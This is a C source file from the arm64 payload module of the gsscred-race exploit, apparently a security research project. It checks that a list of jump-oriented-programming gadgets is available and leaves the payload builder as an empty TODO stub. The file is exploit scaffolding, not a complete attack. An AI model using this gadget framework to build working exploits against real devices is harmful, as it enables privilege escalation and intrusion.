/*
 * gsscred-race
 * Brandon Azad
 *
 *
 * The arm64 exploit payload
 * ------------------------------------------------------------------------------------------------
 *
 *  TODO
 */

#include "arm64/arm64_payload.h"

#include "arm64/gadgets.h"
#include "log.h"

// Check that all the necessary gadgets for this JOP payload are provided by the platform.
static bool
check_platform() {
	bool all_found = true;
#define NEED(gadget)									\
	if (gadgets[gadget].address == 0) {						\
		DEBUG_TRACE(1, "Could not find gadget: %s", gadgets[gadget].str);	\
		all_found = false;							\
	}
	NEED(LDP_X8_X2_X19__BLR_X8);
	NEED(LDP_X3_X2_X2__BR_X3);
	NEED(ADD_X1_X21_X20__BLR_X8);
	NEED(MOV_X20_X1_BLR_X8);
	NEED(STR_X1_X19_40__BLR_X8);
	NEED(MOV_X0_X26__BLR_X8);
	NEED(SUB_X1_X1_X0__BLR_X8);
	NEED(MOV_X13_X1__BR_X8);
	NEED(MOV_X9_X13__BR_X8);
	NEED(MOV_X11_X24__BR_X8);
	NEED(CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8);
	NEED(MOV_X9_X22__BR_X8);
	NEED(CSEL_X2_X11_X9_LT__BLR_X8);
	NEED(MOV_X0_X27__BLR_X8);
	NEED(BLR_X23__MOV_X0_X21__BLR_X25);
#undef NEED
	return all_found;
}

// Build the JOP payload.
static void
build_payload(uint8_t *payload) {
	// TODO
}

const struct payload_strategy payload_strategy_1 = {
	.check_platform = check_platform,
	.build_payload  = build_payload,
};
